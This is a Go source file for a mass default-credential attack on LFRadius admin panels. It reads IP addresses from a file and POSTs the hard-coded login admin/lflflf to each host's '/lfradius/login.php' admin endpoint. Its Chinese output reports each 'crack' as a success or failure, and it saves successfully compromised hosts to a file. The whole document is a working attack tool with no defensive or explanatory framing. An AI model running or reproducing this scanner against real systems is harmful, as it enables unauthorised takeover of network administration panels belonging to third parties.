package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"os"
	"io"
	"bufio"
)
var ip_list []string
func httpDo(url string) {
	ip := strings.Replace(url, "https://", "", -1)
	ip = strings.Replace(ip, "http://", "", -1)
	client := &http.Client{}
	password := `username=admin&password=lflflf&checkcode=`
	req, err := http.NewRequest("POST", url+"/lfradius/login.php?c=login&a=adminlogin", strings.NewReader(password))
	if err != nil {
		fmt.Println("主机可能不存活")
	}
	req.Header.Set("Host",ip)
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", url+"/lfradius/login.php?c=login&a=showlogin")
	req.Header.Set("Origin", "url")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("主机可能不存活")
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取失败")
	}
	str := string(body)
	if strings.Contains(str, "/lfradius/login.php/login/showdefault") {
		fmt.Println("破解成功" + url)
		writer(url)
	} else {
		fmt.Println("破解失败" + url)
	}
}

func main() {
	var ipfile string
	flag.StringVar(&ipfile, "f", "", "file")
	flag.Parse()
	list(ipfile)
	vpn_pass(ip_list)

}

func vpn_pass(iplist []string) {
	for j := 0; j < len(iplist); j++ {
		httpDo(iplist[j])
	}
	}

func list(ipfile string) {
	ip_file, err := os.Open(ipfile)
	if err != nil {
		fmt.Print("文件打开失败,请确认存放IP文件的路径,文件名是否正确!\n")
		os.Exit(0)
	}
	defer ip_file.Close()
	readerip := bufio.NewReader(ip_file)
	for {
		ip, err := readerip.ReadString('\n')
		ip = strings.Replace(ip, " ", "", -1)
		ip = strings.Replace(ip, "\n", "", -1)
		ip = strings.Replace(ip, "\r", "", -1)
		ip_list = append(ip_list, ip)
		if err == io.EOF {
			break
		}
	}
}
func writer(ip string) {
	ip = strings.Replace(ip, " ", "", -1)
	ola, _ := os.OpenFile("破解成功.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ola.Close()
	ola.Write([]byte(ip +"\n"))
}